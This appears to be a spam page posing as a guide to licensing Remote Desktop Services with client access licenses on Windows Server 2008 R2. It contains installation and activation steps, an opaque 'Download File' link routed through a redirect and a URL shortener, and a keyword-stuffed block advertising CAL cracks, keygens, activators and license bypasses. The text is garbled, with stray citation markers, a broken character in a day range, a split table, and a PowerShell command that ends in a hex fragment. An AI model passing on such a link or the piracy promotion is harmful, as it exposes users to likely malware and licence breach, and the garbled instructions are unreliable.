# How to License Your RDS Deployment with Client Access Licenses (CALs)
 
Remote Desktop Services (RDS) is a feature of Windows Server 2008 R2 that allows users to access desktops and applications remotely from any device. RDS requires a license server to issue and manage client access licenses (CALs) for each user and device that connects to an RDS host.
 
In this article, we will explain how to install and activate the license server, how to choose between per user and per device licensing models, and how to install and activate RDS CALs.
 
**Download File ->>->>->> [https://www.google.com/url?q=https%3A%2F%2Fcinurl.com%2F2uJUHS&sa=D&sntz=1&usg=AOvVaw0eL-kgtKQmDrGi2tVB3WHy](https://www.google.com/url?q=https%3A%2F%2Fcinurl.com%2F2uJUHS&sa=D&sntz=1&usg=AOvVaw0eL-kgtKQmDrGi2tVB3WHy)**


 
## Install and Activate the License Server
 
The license server is a role service of RDS that can be installed on any server in your domain. To install the license server, follow these steps[^1^]:
 
1. Sign into the server you want to use as the license server using an administrator account.
2. In Server Manager, click Roles Summary, and then click Add Roles.
3. Click Next on the first page of the roles wizard.
4. Select Remote Desktop Services, and then click Next, and then Next on the Remote Desktop Services page.
5. Select Remote Desktop Licensing, and then click Next.
6. Configure the domain - select Configure a discovery scope for this license server, click This domain, and then click Next.
7. Click Install.

To activate the license server, follow these steps[^1^]:

1. Open the Remote Desktop Licensing Manager: click Start > Administrative Tools > Remote Desktop Services > Remote Desktop Licensing Manager.
2. Right-click the license server, and then click Activate Server.
3. Click Next on the welcome page.
4. For the connection method, select Automatic connection (recommended), and then click Next.
5. Enter your company information (your name, the company name, your geographic region), and then click Next.
6. Optionally enter any other company information (for example, email and company addresses), and then click Next.
7. Make sure that Start Install Licenses Wizard now is not selected (we'll install the licenses in a later step), and then click Next.

Your license server is now ready to start issuing and managing licenses.
 
## Choose Between Per User and Per Device Licensing Models
 
RDS supports two types of CALs: per user and per device. The following table outlines the differences between the two types of CALs[^1^]:

| Per Device | Per User |
| --- | --- |

| RDS CALs are physically assigned to each device. | RDS CALs are assigned to a user in Active Directory. |

| RDS CALs are tracked by the license server. | RDS CALs are tracked by the license server. |

| RDS CALs can be tracked regardless of Active Directory membership. | RDS CALs cannot be tracked within a workgroup. |

| You can revoke up to 20% of RDS CALs. | You cannot revoke any RDS CALs. |

| Temporary RDS CALs are valid for 52â89 days. | Temporary RDS CALs are not available. |

| RDS CALs cannot be overallocated. | RDS CALs can be overallocated (in breach of the Remote Desktop licensing agreement). |

An example of where one would use the per device model would be in an environment where there are two or more shifts using the same computers to access the RDS host(s).
 
windows server 2008 r2 rds cal crack,  windows server 2008 r2 terminal services license hack,  windows server 2008 r2 remote desktop license bypass,  windows server 2008 r2 rdp license activator,  windows server 2008 r2 remote desktop services license keygen,  windows server 2008 r2 terminal services licensing grace period,  windows server 2008 r2 remote desktop license expired,  windows server 2008 r2 rds cal generator,  windows server 2008 r2 terminal services license reset,  windows server 2008 r2 remote desktop license error,  windows server 2008 r2 rdp license patch,  windows server 2008 r2 remote desktop services license server,  windows server 2008 r2 terminal services license mode,  windows server 2008 r2 remote desktop license install,  windows server 2008 r2 rds cal price,  windows server 2008 r2 terminal services license manager,  windows server 2008 r2 remote desktop license configuration,  windows server 2008 r2 rdp license registry,  windows server 2008 r2 remote desktop services license activation,  windows server 2008 r2 terminal services license troubleshooting,  windows server 2008 r2 remote desktop license per user,  windows server 2008 r2 rds cal compatibility,  windows server 2008 r2 terminal services license backup,  windows server 2008 r2 remote desktop license per device,  windows server 2008 r2 rds cal upgrade,  windows server 2008 r2 terminal services license migration,  windows server 2008 r2 remote desktop license report,  windows server 2008 r2 rdp license viewer,  windows server 2008 r2 remote desktop services license requirements,  windows server 2008 r2 terminal services license revoke,  windows server 2008 r2 remote desktop license purchase,  windows server 2008 r2 rds cal type,  windows server 2008 r2 terminal services license monitor,  windows server 2008 r2 remote desktop license limit,  windows server 2008 r2 rdp license location,  windows server 2008 r2 remote desktop services licensing best practices,  windows server 2008 r2 terminal services licensing policy,  windows server 2008 r2 remote desktop license renewal,  windows server 2008 r2 rds cal availability,  windows server 2008 r2 terminal services licensing mode not configured,  windows server 2008 r2 remote desktop license issue,  windows server 2008 r2 rdp license missing,  windows server 2008 r2 remote desktop services licensing mode change greyed out[^1^],  windows server 2008 r2 terminal services licensing event log[^1^],  windows server 2008 r2 remote desktop license not working[^1^],  windows server 2008 r2 rdsh no redirector mode[^1^],  how to remove concurrent sessions on Windows Server[^3^],  how to troubleshoot RDS Licensing[^4^],  how to activate the License Server by using the Remote Desktop[^1^],  how to check the current grace period on a computer[^4^]
  
An example of where one would use the per user model would be in an environment where users access the RDS host(s) from multiple devices (for example, laptops, tablets, smartphones).
  
To configure the licensing mode on your RDS host(s), run the following PowerShell command[^3^]:

    $obj = gwmi -namespace "Root/CIMV2/TerminalServices" Win32_Term 8cf37b1e13

    
